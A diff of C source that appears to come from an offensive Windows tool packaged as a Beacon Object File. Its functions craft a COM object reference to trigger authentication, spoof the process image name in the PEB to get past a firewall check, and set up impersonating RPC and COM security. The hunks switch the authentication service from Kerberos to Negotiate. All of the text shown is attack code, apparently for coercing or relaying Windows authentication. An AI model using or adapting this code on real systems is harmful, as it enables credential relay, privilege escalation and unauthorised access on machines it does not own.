@@ -1240,7 +1240,7 @@ static int build_objref(IUnknown *anchor, TRIGGER *trigger) {
     cursor += 2;
 
     if (g_state.rewrite_security_binding) {
-        wr16(cursor, RPC_C_AUTHN_GSS_KERBEROS);
+        wr16(cursor, RPC_C_AUTHN_GSS_NEGOTIATE);
         wr16(cursor + 2, 0xffff); /* default authorization service */
         cursor += 4;
         for (i = 0; i <= spn_chars; i++) {
@@ -1833,7 +1833,7 @@ static int initialize_worker_com(void) {
     }
     kcopy(persistent_principal, g_state.service_spn,
           (principal_chars + 1) * sizeof(WCHAR));
-    persistent_service->dwAuthnSvc = RPC_C_AUTHN_GSS_KERBEROS;
+    persistent_service->dwAuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
     persistent_service->pPrincipalName = persistent_principal;
 
     /* patch_firewall_name borrows the PEB image-name buffer. Restore those
@@ -1847,7 +1847,7 @@ static int initialize_worker_com(void) {
 
     g_state.stage = STAGE_COM_SECURITY;
     hr = OLE32$CoInitializeSecurity(
-        NULL, 1, persistent_service, NULL, RPC_C_AUTHN_LEVEL_CONNECT,
+        NULL, 1, persistent_service, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
         RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
     kcopy(image_name->Buffer, saved_image_name, sizeof(saved_image_name));
 
@@ -1899,7 +1899,7 @@ static int register_task_resolver(void) {
     }
 
     status = RPCRT4$RpcServerRegisterAuthInfoW(
-        NULL, RPC_C_AUTHN_GSS_KERBEROS, NULL, NULL);
+        NULL, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, NULL);
     if (status) {
         g_state.detail = (int)status;
         return 0;
